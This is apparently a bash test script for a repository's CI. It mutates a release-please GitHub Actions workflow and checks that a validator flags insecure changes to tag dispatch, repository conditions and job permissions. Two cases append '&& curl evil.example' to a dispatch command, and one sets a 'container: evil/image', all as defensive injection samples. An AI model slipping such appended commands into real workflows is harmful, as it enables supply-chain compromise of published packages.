#!/usr/bin/env bash
# Drives .github/scripts/assert-release-chain.py against release-please.yml and
# mutated copies of it. Merging the release PR publishes to npm with no approval
# in between, so the chain must dispatch on the TAG, only for this repository
# with NPM_RELEASE=true, and `actions: write` must live in a job of its own.
set -uo pipefail

ROOT=$(cd "$(dirname "$0")/../.." && pwd)
CHECK="$ROOT/.github/scripts/assert-release-chain.py"
REAL="$ROOT/.github/workflows/release-please.yml"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
pass=0
fail=0

case_() {
  local name=$1 expect=$2 mutation=$3
  local f="$WORK/release-please.yml"
  MUT="$mutation" python3 - "$REAL" "$f" <<'PY'
import os, sys
s = open(sys.argv[1], encoding='utf-8').read()
before = s
exec(os.environ['MUT'])
if os.environ['MUT'] and s == before:
    sys.exit('mutation did not change the file — the test is stale')
open(sys.argv[2], 'w', encoding='utf-8').write(s)
PY
  [ $? -eq 0 ] || { echo "  FAIL $name — bad mutation"; fail=$((fail + 1)); return; }
  local out rc got
  out=$(python3 "$CHECK" "$f" 2>&1); rc=$?
  case "$rc" in 0) got=ok ;; 1) got=flagged ;; *) got=broken ;; esac
  if [ "$got" = "$expect" ]; then
    echo "  ok   $name ($expect)"
    pass=$((pass + 1))
  else
    echo "  FAIL $name — $got, want $expect"
    echo "$out" | sed 's/^/       /'
    fail=$((fail + 1))
  fi
}

case_ "the real workflow"                          ok      ''
case_ "dispatch on main instead of the tag"        flagged "s = s.replace('--ref \"refs/tags/\$TAG\"', '--ref main')"
case_ "dispatch on the triggering ref"             flagged "s = s.replace('--ref \"refs/tags/\$TAG\"', '--ref \"\$GITHUB_REF_NAME\"')"
case_ "dispatch by bare tag name (branch clash)"   flagged "s = s.replace('--ref \"refs/tags/\$TAG\"', '--ref \"\$TAG\"')"
case_ "extra command appended to the dispatch"     flagged "s = s.replace('--ref \"refs/tags/\$TAG\"\n', '--ref \"refs/tags/\$TAG\" && curl evil.example\n')"
case_ "tag not validated"                          flagged "import re; s = re.sub(r'\\[\\[ \"\\\$TAG\" =~[^\\n]*\\|\\| \\{[^\\n]*\\}\\n\\s*', '', s)"
case_ "TAG taken from somewhere else"              flagged "s = s.replace('TAG: \${{ needs.release-please.outputs.tag_name }}', 'TAG: \${{ github.ref_name }}')"
case_ "repository condition removed (release-please)" flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true' &&\\n      github.ref\", \"vars.NPM_RELEASE == 'true' &&\\n      github.ref\")"
case_ "repository condition removed (publish)"     flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true' &&\\n      needs\", \"vars.NPM_RELEASE == 'true' &&\\n      needs\")"
case_ "NPM_RELEASE removed (publish)"              flagged "s = s.replace(\" && vars.NPM_RELEASE == 'true' &&\\n      needs\", \" &&\\n      needs\")"
case_ "publish runs without release_created"      flagged "s = s.replace(\" &&\\n      needs.release-please.outputs.release_created == 'true'\", '')"
case_ "extra permission on the dispatch job"       flagged "s = s.replace('    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch', '    permissions:\\n      actions: write\\n      contents: write\\n    steps:\\n      - name: Dispatch')"
case_ "id-token on the dispatch job"               flagged "s = s.replace('    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch', '    permissions:\\n      actions: write\\n      id-token: write\\n    steps:\\n      - name: Dispatch')"
case_ "actions: write on release-please-action"    flagged "s = s.replace('      contents: write\\n      pull-requests: write\\n    outputs', '      contents: write\\n      pull-requests: write\\n      actions: write\\n    outputs')"
case_ "dispatch job checks out code"               flagged "s = s.replace('    steps:\\n      - name: Dispatch', '    steps:\\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\\n      - name: Dispatch')"
case_ "ci job gains a permission"                  flagged "s = s.replace('      actions: write\\n    steps:\\n      - name: Run CI', '      actions: write\\n      contents: write\\n    steps:\\n      - name: Run CI')"
case_ "workflow-level write permission"            flagged "s = s.replace('permissions:\\n  contents: read\\n\\njobs:', 'permissions:\\n  contents: write\\n\\njobs:', 1)"
case_ "dispatch job loses its need"                flagged "s = s.replace('  publish:\\n    needs: release-please\\n', '  publish:\\n')"

case_ "release-please runs from any branch"       flagged "s = s.replace(\" &&\\n      github.ref == 'refs/heads/main'\", '', 1)"
case_ "job-level env on the dispatch job"          flagged "s = s.replace('    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch', '    env:\\n      X: 1\\n    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch')"
case_ "job-level container on the dispatch job"    flagged "s = s.replace('    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch', '    container: evil/image\\n    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch')"
case_ "ci-release-pr without its if"               flagged "s = s.replace(\"      needs.release-please.outputs.prs_created == 'true'\\n\", \"      true\\n\")"
case_ "ci-release-pr runs for any repository"      flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true' &&\\n      needs.release-please.outputs.prs_created\", \"vars.NPM_RELEASE == 'true' &&\\n      needs.release-please.outputs.prs_created\")"
case_ "ci-release-pr ref not from pr_branch"       flagged "s = s.replace('BRANCH: \${{ needs.release-please.outputs.pr_branch }}', 'BRANCH: \${{ github.head_ref }}')"
case_ "ci-release-pr runs another command"         flagged "s = s.replace('--ref \"\$BRANCH\"', '--ref \"\$BRANCH\" && curl evil.example')"
case_ "pr_branch output removed"                   flagged "import re; s = re.sub(r'      pr_branch: [^\\n]*\\n', '', s)"

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
